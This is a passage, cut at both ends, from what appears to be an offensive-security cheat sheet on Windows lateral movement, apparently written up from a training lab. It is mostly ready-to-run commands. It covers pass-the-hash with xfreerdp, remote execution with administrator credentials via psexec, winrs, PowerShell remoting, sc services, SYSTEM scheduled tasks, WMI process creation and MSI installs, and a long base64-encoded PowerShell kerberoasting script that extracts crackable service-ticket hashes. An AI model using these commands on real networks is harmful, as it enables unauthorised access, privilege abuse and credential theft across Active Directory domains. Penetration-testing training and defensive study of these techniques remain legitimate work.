<p><code>xfreerdp</code> can then be used to pass the hash with the <code>/pth</code> flag.</p>

<h3>remote commands with psexec / winRM / sc / schtasks</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># run commands remotely with psexec</span><span class="w">
</span><span class="n">psexec64.exe</span><span class="w"> </span><span class="nx">\\MACHINE_IP</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">admin_pass</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">

</span><span class="c"># run powershell commands remotely with winrs</span><span class="w">
</span><span class="n">winrs.exe</span><span class="w"> </span><span class="nt">-u</span><span class="p">:</span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-p</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">admin_pass</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">target</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd</span><span class="w">

</span><span class="c"># run commands remotely with powershell only</span><span class="w">
</span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Administrator'</span><span class="p">;</span><span class="w">
</span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'&lt;admin_pass&gt;'</span><span class="p">;</span><span class="w">
</span><span class="nv">$securePassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nv">$password</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w"> 
</span><span class="nv">$credential</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nv">$username</span><span class="p">,</span><span class="w"> </span><span class="nv">$securePassword</span><span class="p">;</span><span class="w">

</span><span class="c"># then use the $credentials object with:</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$credential</span><span class="w">

</span><span class="c"># you can also use it with:</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$credential</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w">

</span><span class="c"># run blind commands by creating services with sc</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">\\TARGET</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;command_to_run&gt;"</span><span class="w"> </span><span class="n">start</span><span class="o">=</span><span class="w"> </span><span class="n">auto</span><span class="w">
</span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">\\TARGET</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># stop and delete the service once done</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">\\TARGET</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">\\TARGET</span><span class="w"> </span><span class="nx">delete</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># run blind commands by creating scheduled tasks remotely</span><span class="w">
</span><span class="c"># we run the task manually so we set up a useless starting date (/sd) and starting time (/st)</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/RU</span><span class="w"> </span><span class="s2">"SYSTEM"</span><span class="w"> </span><span class="nx">/create</span><span class="w"> </span><span class="nx">/tn</span><span class="w"> </span><span class="s2">"&lt;task_name&gt;"</span><span class="w"> </span><span class="nx">/tr</span><span class="w"> </span><span class="s2">"&lt;command_to_run&gt;"</span><span class="w"> </span><span class="nx">/sc</span><span class="w"> </span><span class="nx">ONCE</span><span class="w"> </span><span class="nx">/sd</span><span class="w"> </span><span class="nx">01/01/1970</span><span class="w"> </span><span class="nx">/st</span><span class="w"> </span><span class="nx">00:00</span><span class="w"> 
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/run</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"&lt;task_name&gt;"</span><span class="w"> 

</span><span class="c"># delete the scheduled task once done</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"&lt;task_name&gt;"</span><span class="w"> </span><span class="nx">/DELETE</span><span class="w"> </span><span class="nx">/F</span><span class="w">
</span></code></pre></div>

<h3>WMI</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># create a credential object that we will use with WMI</span><span class="w">
</span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Administrator'</span><span class="p">;</span><span class="w">
</span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'&lt;admin_pass&gt;'</span><span class="p">;</span><span class="w">
</span><span class="nv">$securePassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nv">$password</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w">
</span><span class="nv">$credential</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nv">$username</span><span class="p">,</span><span class="w"> </span><span class="nv">$securePassword</span><span class="p">;</span><span class="w">

</span><span class="c"># establish which protocol to use (DCOM or wsman) and create your session</span><span class="w">
</span><span class="nv">$Opt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-CimSessionOption</span><span class="w"> </span><span class="nt">-Protocol</span><span class="w"> </span><span class="nx">DCOM</span><span class="w">
</span><span class="nv">$Session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Cimsession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$credential</span><span class="w"> </span><span class="nt">-SessionOption</span><span class="w"> </span><span class="nv">$Opt</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">Stop</span><span class="w">

</span><span class="c"># using the session for remote process creation:</span><span class="w">
</span><span class="c"># the command will be run blindly and you won't see the output</span><span class="w">
</span><span class="nv">$Command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"powershell.exe &lt;your_command_here&gt;"</span><span class="p">;</span><span class="w">

</span><span class="n">Invoke-CimMethod</span><span class="w"> </span><span class="nt">-CimSession</span><span class="w"> </span><span class="nv">$Session</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w"> </span><span class="nt">-MethodName</span><span class="w"> </span><span class="nx">Create</span><span class="w"> </span><span class="nt">-Arguments</span><span class="w"> </span><span class="p">@{</span><span class="w">
</span><span class="nx">CommandLine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$Command</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="c"># alternative command for legacy systems</span><span class="w">
</span><span class="n">wmic.exe</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/password:</span><span class="err">&lt;</span><span class="nx">admin_pass</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/node:</span><span class="err">&lt;</span><span class="nx">target</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">call</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="s2">"cmd.exe /c &lt;your_command_here&gt;"</span><span class="w">

</span><span class="c"># using the session for creating services remotely:</span><span class="w">
</span><span class="n">Invoke-CimMethod</span><span class="w"> </span><span class="nt">-CimSession</span><span class="w"> </span><span class="nv">$Session</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">Win32_Service</span><span class="w"> </span><span class="nt">-MethodName</span><span class="w"> </span><span class="nx">Create</span><span class="w"> </span><span class="nt">-Arguments</span><span class="w"> </span><span class="p">@{</span><span class="w">
</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;service_name&gt;"</span><span class="p">;</span><span class="w">
</span><span class="nx">DisplayName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;service_name&gt;"</span><span class="p">;</span><span class="w">
</span><span class="nx">PathName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;your_command_here"</span><span class="p">;</span><span class="w">
</span><span class="nx">ServiceType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">]</span><span class="err">::</span><span class="nx">Parse</span><span class="err">(</span><span class="s2">"16"</span><span class="err">)</span><span class="p">;</span><span class="w"> </span><span class="c"># Win32OwnProcess : Start service in a new process</span><span class="w">
</span><span class="nx">StartMode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Manual"</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="c"># then we can target the service and start it</span><span class="w">
</span><span class="nv">$Service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nt">-CimSession</span><span class="w"> </span><span class="nv">$Session</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">Win32_Service</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="s2">"Name LIKE '&lt;service_name&gt;'"</span><span class="w">
</span><span class="n">Invoke-CimMethod</span><span class="w"> </span><span class="nt">-InputObject</span><span class="w"> </span><span class="nv">$Service</span><span class="w"> </span><span class="nt">-MethodName</span><span class="w"> </span><span class="nx">StartService</span><span class="w">

</span><span class="c"># stop the service and delete it once done</span><span class="w">
</span><span class="n">Invoke-CimMethod</span><span class="w"> </span><span class="nt">-InputObject</span><span class="w"> </span><span class="nv">$Service</span><span class="w"> </span><span class="nt">-MethodName</span><span class="w"> </span><span class="nx">StopService</span><span class="w">
</span><span class="n">Invoke-CimMethod</span><span class="w"> </span><span class="nt">-InputObject</span><span class="w"> </span><span class="nv">$Service</span><span class="w"> </span><span class="nt">-MethodName</span><span class="w"> </span><span class="nx">Delete</span><span class="w">

</span><span class="c"># using the session for creating scheduled tasks remotely:</span><span class="w">
</span><span class="c"># split your payload and separate command and args</span><span class="w">
</span><span class="nv">$Command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"cmd.exe"</span><span class="w">
</span><span class="nv">$Args</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;your_args_here&gt;"</span><span class="w">

</span><span class="c"># then create and start scheduled task</span><span class="w">
</span><span class="nv">$Action</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskAction</span><span class="w"> </span><span class="nt">-CimSession</span><span class="w"> </span><span class="nv">$Session</span><span class="w"> </span><span class="nt">-Execute</span><span class="w"> </span><span class="nv">$Command</span><span class="w"> </span><span class="nt">-Argument</span><span class="w"> </span><span class="nv">$Args</span><span class="w">
</span><span class="n">Register-ScheduledTask</span><span class="w"> </span><span class="nt">-CimSession</span><span class="w"> </span><span class="nv">$Session</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nv">$Action</span><span class="w"> </span><span class="nt">-User</span><span class="w"> </span><span class="s2">"NT AUTHORITY\SYSTEM"</span><span class="w"> </span><span class="nt">-TaskName</span><span class="w"> </span><span class="s2">"&lt;task_name&gt;"</span><span class="w">
</span><span class="n">Start-ScheduledTask</span><span class="w"> </span><span class="nt">-CimSession</span><span class="w"> </span><span class="nv">$Session</span><span class="w"> </span><span class="nt">-TaskName</span><span class="w"> </span><span class="s2">"&lt;task_name&gt;"</span><span class="w">

</span><span class="c"># delete the scheduled task once done</span><span class="w">
</span><span class="n">Unregister-ScheduledTask</span><span class="w"> </span><span class="nt">-CimSession</span><span class="w"> </span><span class="nv">$Session</span><span class="w"> </span><span class="nt">-TaskName</span><span class="w"> </span><span class="s2">"&lt;task_name&gt;"</span><span class="w">

</span><span class="c"># using the session to install MSI packages, copied on target by any means:</span><span class="w">
</span><span class="n">Invoke-CimMethod</span><span class="w"> </span><span class="nt">-CimSession</span><span class="w"> </span><span class="nv">$Session</span><span class="w"> </span><span class="nt">-ClassName</span><span class="w"> </span><span class="nx">Win32_Product</span><span class="w"> </span><span class="nt">-MethodName</span><span class="w"> </span><span class="nx">Install</span><span class="w"> </span><span class="nt">-Arguments</span><span class="w"> </span><span class="p">@{</span><span class="nx">PackageLocation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;msi_package_absolute_path&gt;"</span><span class="p">;</span><span class="w"> </span><span class="nx">Options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="p">;</span><span class="w"> </span><span class="nx">AllUsers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$false</span><span class="p">}</span><span class="w">

</span><span class="c"># install MSI packages on legacy systems</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">/node:</span><span class="err">&lt;</span><span class="nx">target</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:DOMAIN\USER</span><span class="w"> </span><span class="nx">product</span><span class="w"> </span><span class="nx">call</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">PackageLocation</span><span class="o">=</span><span class="n">c:\Windows\myinstaller.msi</span><span class="w">
</span></code></pre></div>

<h3>AD exploitation</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># request and get a TGS hash from a SPN for either john, hashcat or kerberoast (select one of those when prompted for "Format")</span><span class="w">
</span><span class="nv">$getTGSCipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"CgAKACAAIAAgACAAWwBDAG0AZABsAGUAdABCAGkAbgBkAGkAbgBnACgAKQBdAAoAIAAgACAAIABwAGEAcgBhAG0ACgAgACAAIAAgACgACgAgACAAIAAgACAAIAAgACAAWwBwAGEAcgBhAG0AZQB0AGUAcgAoAE0AYQBuAGQAYQB0AG8AcgB5AD0AJABUAHIAdQBlACwAIABQAG8AcwBpAHQAaQBvAG4APQAwACwAIABWAGEAbAB1AGUARgByAG8AbQBQAGkAcABlAGwAaQBuAGUAPQAkAFQAcgB1AGUAKQBdAAoAIAAgACAAIAAgACAAIAAgAFsAVgBhAGwAaQBkAGEAdABlAE4AbwB0AE4AdQBsAGwATwByAEUAbQBwAHQAeQAoACkAXQAKACAAIAAgACAAIAAgACAAIABbAHMAdAByAGkAbgBnAF0AJABTAFAATgAsAAoAIAAgACAAIAAgACAAIAAgAFsAcABhAHIAYQBtAGUAdABlAHIAKABNAGEAbgBkAGEAdABvAHIAeQA9ACQAVAByAHUAZQAsACAAUABvAHMAaQB0AGkAbwBuAD0AMQAsACAAVgBhAGwAdQBlAEYAcgBvAG0AUABpAHAAZQBsAGkAbgBlAD0AJABUAHIAdQBlACkAXQAKACAAIAAgACAAIAAgACAAIABbAFYAYQBsAGkAZABhAHQAZQBTAGUAdAAoACIASABhAHMAaABjAGEAdAAiACwAIgBKAG8AaABuACIALAAgACIASwBlAHIAYgBlAHIAbwBhAHMAdAAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAHMAdAByAGkAbgBnAF0AJABGAG8AcgBtAGEAdAAsAAoAIAAgACAAIAAgACAAIAAgAFsAUwB3AGkAdABjAGgAXQAkAE4AbwBRAHUAZQByAHkACgAgACAAIAAgACkACgAKACAAIAAgACAAQgBlAGcAaQBuACAAewAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACEAJABOAG8AUQB1AGUAcgB5ACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQARgBvAHIAZQBzAHQAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEQAaQByAGUAYwB0AG8AcgB5AFMAZQByAHYAaQBjAGUAcwAuAEEAYwB0AGkAdgBlAEQAaQByAGUAYwB0AG8AcgB5AC4ARgBvAHIAZQBzAHQAXQA6ADoARwBlAHQAQwB1AHIAcgBlAG4AdABGAG8AcgBlAHMAdAAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAFAAYQB0AGgAIAA9ACAAJwBHAEMAOgAvAC8ARABDAD0AJwAgACsAIAAoACQARgBvAHIAZQBzAHQALgBSAG8AbwB0AEQAbwBtAGEAaQBuACAALQBSAGUAcABsAGEAYwBlACAAKAAiAFwALgAiACwAJwAsAEQAQwA9ACcAKQApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBjAHIAZQBhAHQAaQBuAGcAIABBAEQAUwBJACAAcwBlAGEAcgBjAGgAZQByACAAbwBuACAAYQAgAEcAQwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAUwBlAGEAcgBjAGgAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQByAGUAYwB0AG8AcgB5AFMAZQByAHYAaQBjAGUAcwAuAEQAaQByAGUAYwB0AG8AcgB5AFMAZQBhAHIAYwBoAGUAcgAoAFsAQQBEAFMASQBdACQAUABhAHQAaAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABTAGUAYQByAGMAaABlAHIALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFQAbwBMAG8AYQBkAC4AQQBkAGQAKAAiAHUAcwBlAHIAcAByAGkAbgBjAGkAcABhAGwAbgBhAG0AZQAiACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ASQBkAGUAbgB0AGkAdAB5AE0AbwBkAGUAbAAKACAAIAAgACAAIAAgACAAIAAkAFQAYQByAGcAZQB0AEwAaQBzAHQAIAA9ACAAQAAoACkAIAAgACAAIAAgACAAIAAgAAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAFYAZQByAGIAbwBzAGUAIAAiAFMAdABhAHIAdABpAG4AZwAgAHQAbwAgAHIAZQBxAHUAZQBzAHQAIABTAFAATgBzACIACgAgACAAIAAgAH0ACgAgACAAIAAgAFAAcgBvAGMAZQBzAHMAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAVABhAHIAZwBlAHQAQQBjAGMAbwB1AG4AdAAgAD0AIAAiAE4ALwBBACIACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAhACQATgBvAFEAdQBlAHIAeQApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAUwBlAGEAcgBjAGgAZQByAC4ARgBpAGwAdABlAHIAIAA9ACAAIgAoAHMAZQByAHYAaQBjAGUAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA9ACQAUwBQAE4AKQAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABUAGEAcgBnAGUAdABBAGMAYwBvAHUAbgB0ACAAPQAgAFsAcwB0AHIAaQBuAGcAXQAkAFMAZQBhAHIAYwBoAGUAcgAuAEYAaQBuAGQATwBuAGUAKAApAC4AUAByAG8AcABlAHIAdABpAGUAcwAuAHUAcwBlAHIAcAByAGkAbgBjAGkAcABhAGwAbgBhAG0AZQAKACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAFYAZQByAGIAbwBzAGUAIAAiAEEAcwBrAGkAbgBnACAAZgBvAHIAIABUAEcAUwAgAGYAbwByACAAdABoAGUAIABTAFAATgA6ACAAJABTAFAATgAiAAoAIAAgACAAIAAgACAAIAAgACQAQgB5AHQAZQBTAHQAcgBlAGEAbQAgAD0AIAAkAG4AdQBsAGwACgAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwByAGUAcQB1AGUAcwB0AGkAbgBnACAAVABHAFMAIAAoAHMAZQByAHYAaQBjAGUAIAB0AGkAYwBrAGUAdAApACAAZgBvAHIAIAB0AGgAZQAgAHQAYQByAGcAZQB0ACAAUwBQAE4ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAFQAaQBjAGsAZQB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkAZABlAG4AdABpAHQAeQBNAG8AZABlAGwALgBUAG8AawBlAG4AcwAuAEsAZQByAGIAZQByAG8AcwBSAGUAcQB1AGUAcwB0AG8AcgBTAGUAYwB1AHIAaQB0AHkAVABvAGsAZQBuACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACQAUwBQAE4ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAeQB0AGUAUwB0AHIAZQBhAG0AIAA9ACAAJABUAGkAYwBrAGUAdAAuAEcAZQB0AFIAZQBxAHUAZQBzAHQAKAApAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAFcAYQByAG4AaQBuAGcAIAAiAEMAbwB1AGwAZAAgAG4AbwB0ACAAcgBlAHEAdQBlAHMAdAAgAGEAIABUAEcAUwAgAGYAbwByACAAdABoAGUAIABTAFAATgA6ACAAJABTAFAATgAgAC0AIABJAHMAIABpAHQAIABlAHgAaQBzAHQAcwA/ACIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBWAGUAcgBiAG8AcwBlACAAIgBNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAUwBQAE4AOgAgACQAUwBQAE4AIABpAHMAIAByAGUAZwBpAHMAdABlAGQAIABvAG4AIABBAGMAdABpAHYAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACIAIAAKACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABCAHkAdABlAFMAdAByAGUAYQBtACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAYwBvAG4AdgBlAHIAdABpAG4AZwAgAGIAeQB0AGUAIABhAHIAcgBhAHkAIAB0AG8AIABoAGUAeAAgAHMAdAByAGkAbgBnAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABIAGUAeABTAHQAcgBlAGEAbQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQgBpAHQAQwBvAG4AdgBlAHIAdABlAHIAXQA6ADoAVABvAFMAdAByAGkAbgBnACgAJABCAHkAdABlAFMAdAByAGUAYQBtACkAIAAtAHIAZQBwAGwAYQBjAGUAIAAiAC0AIgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAZQB4AHQAcgBhAGMAdABpAG4AZwAgAGEAbgBkACAAYwBvAG4AdgBlAHQAaQBuAGcAIAB0AGgAZQAgAGgAZQB4ACAAdgBhAGwAdQBlACAAbwBmACAAdABoAGUAIABjAGkAcABoAGUAcgAnAHMAIABlAHQAeQBwAGUAIAB0AG8AIABkAGUAYwBpAG0AYQBsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABlAFQAeQBwAGUAIAA9ACAAIABbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEkAbgB0ADMAMgAoACgAJABIAGUAeABTAHQAcgBlAGEAbQAgAC0AcgBlAHAAbABhAGMAZQAgACIALgAqAEEAMAAwADMAMAAyADAAMQAiACkAWwAwAC4ALgAxAF0AIAAtAGoAbwBpAG4AIAAiACIALAAgADEANgApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBkAGUAdABlAHIAbQBpAG4AZwAgAGUAbgBjAHIAeQBwAHQAaQBvAG4AIAB0AHkAcABlACAAYgB5ACAAZQB0AHkAcABlACAALQAgAGgAdAB0AHAAcwA6AC8ALwB0AG8AbwBsAHMALgBpAGUAdABmAC4AbwByAGcALwBoAHQAbQBsAC8AcgBmAGMAMwA5ADYAMQAgAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABFAG4AYwBUAHkAcABlACAAPQAgAHMAdwBpAHQAYwBoACAAKAAkAGUAVAB5AHAAZQApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMQAgACAAIAAgACAAIAAgAHsAIgBEAEUAUwAtAEMAQgBDAC0AQwBSAEMAIAAoADEAKQAiAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADMAIAAgACAAIAAgACAAIAB7ACIARABFAFMALQBDAEIAQwAtAE0ARAA1ACAAKAAzACkAIgB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAxADcAIAAgACAAIAAgACAAewAiAEEARQBTADEAMgA4AC0AQwBUAFMALQBIAE0AQQBDAC0AUwBIAEEALQAxACAAKAAxADcAKQAiAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADEAOAAgACAAIAAgACAAIAB7ACIAQQBFAFMAMgA1ADYALQBDAFQAUwAtAEgATQBBAEMALQBTAEgAQQAtADEAIAAoADEAOAApACIAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMgAzACAAIAAgACAAIAAgAHsAIgBSAEMANAAtAEgATQBBAEMAIAAoADIAMwApACIAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZABlAGYAYQB1AGwAdAAgAHsAIgBVAG4AawBuAG8AdwBuACAAKAAkAGUAVAB5AHAAZQApACIAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHIAeQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAZQB4AHQAcgBhAGMAdABpAG4AZwAgAHQAaABlACAARQBuAGMAUABhAHIAdAAgAHAAbwByAHQAaQBvAG4AIABvAGYAIAB0AGgAZQAgAFQARwBTAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4AQQByAHIAYQB5AEwAaQBzAHQAXQAkAFAAYQByAHQAcwAgAD0AIAAoACQASABlAHgAUwB0AHIAZQBhAG0AIAAtAHIAZQBwAGwAYQBjAGUAIAAnAF4AKAAuACoAPwApADAANAA4ADIAMAAuAC4ALgAoAC4AKgApACcALAAnACQAMgAnACkAIAAtAFMAcABsAGkAdAAgACIAQQA0ADgAMgAwADEAIgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAFAAYQByAHQAcwAuAEMAbwB1AG4AdAAgAC0AZwB0ACAAMgApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAFAAYQByAHQAcwAuAFIAZQBtAG8AdgBlAEEAdAAoACQAUABhAHIAdABzAC4AQwBvAHUAbgB0ACAALQAgADEAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEUAbgBjAFAAYQByAHQAIAA9ACAAJABQAGEAcgB0AHMAIAAtAGoAbwBpAG4AIAAiAEEANAA4ADIAMAAxACIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQARQBuAGMAUABhAHIAdAAgAD0AIAAkAFAAYQByAHQAcwBbADAAXQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABUAGEAcgBnAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAcABzAG8AYgBqAGUAYwB0ACAALQBQAHIAbwBwAGUAcgB0AHkAIABAAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAUABOACAAIAAgACAAIAAg